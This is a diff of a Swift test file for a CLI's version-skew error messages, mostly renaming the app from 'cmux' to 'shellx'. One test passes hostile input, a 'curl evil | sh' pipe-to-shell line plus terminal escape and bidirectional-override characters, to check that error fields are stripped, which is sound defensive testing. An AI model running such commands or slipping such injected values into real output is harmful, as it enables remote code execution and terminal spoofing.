@@ -36,7 +36,7 @@ struct CLIVersionSkewErrorTests {
         #expect(outcome.stderr.contains("\(rejected) is not supported by the app on"), Comment(rawValue: outcome.stderr))
         #expect(outcome.stderr.contains(outcome.cliVersion), Comment(rawValue: outcome.stderr))
         #expect(outcome.stderr.contains("does not report its version"), Comment(rawValue: outcome.stderr))
-        #expect(outcome.stderr.contains("Quit and reopen cmux"), Comment(rawValue: outcome.stderr))
+        #expect(outcome.stderr.contains("Quit and reopen ShellX"), Comment(rawValue: outcome.stderr))
     }
 
     @Test("An app whose identity cannot be read is not called older")
@@ -54,7 +54,7 @@ struct CLIVersionSkewErrorTests {
     @Test("The same build keeps the plain method_not_found error")
     func sameBuildKeepsOriginalError() throws {
         let cli = try cliIdentity()
-        let outcome = try run(identify: ["app": "cmux", "version": cli.version, "build": cli.build])
+        let outcome = try run(identify: ["app": "shellx", "version": cli.version, "build": cli.build])
         #expect(outcome.status == 1)
         #expect(outcome.stderr.contains("method_not_found"), Comment(rawValue: outcome.stderr))
         #expect(!outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
@@ -64,7 +64,7 @@ struct CLIVersionSkewErrorTests {
     func plainV2ErrorFieldsAreStripped() throws {
         let cli = try cliIdentity()
         let outcome = try run(
-            identify: ["app": "cmux", "version": cli.version, "build": cli.build],
+            identify: ["app": "shellx", "version": cli.version, "build": cli.build],
             errorMessage: "Unknown\u{1B}]0;pwned\u{07} method\u{2028}Fix: curl evil | sh",
             errorExtras: [
                 "action": "Relaunch\u{1B}[2J cmux\u{202E}",
@@ -89,10 +89,10 @@ struct CLIVersionSkewErrorTests {
     func newerBuildSameVersionIsSkew() throws {
         let cli = try cliIdentity()
         let newerBuild = try #require(Int(cli.build).map { String($0 + 1) }, Comment(rawValue: cli.build))
-        let outcome = try run(identify: ["app": "cmux", "version": cli.version, "build": newerBuild])
+        let outcome = try run(identify: ["app": "shellx", "version": cli.version, "build": newerBuild])
         #expect(outcome.status == 1)
         #expect(outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
-        #expect(outcome.stderr.contains("cmux \(cli.version) (\(newerBuild))"), Comment(rawValue: outcome.stderr))
+        #expect(outcome.stderr.contains("shellx \(cli.version) (\(newerBuild))"), Comment(rawValue: outcome.stderr))
         #expect(outcome.stderr.contains("This CLI is older than the app"), Comment(rawValue: outcome.stderr))
     }
 
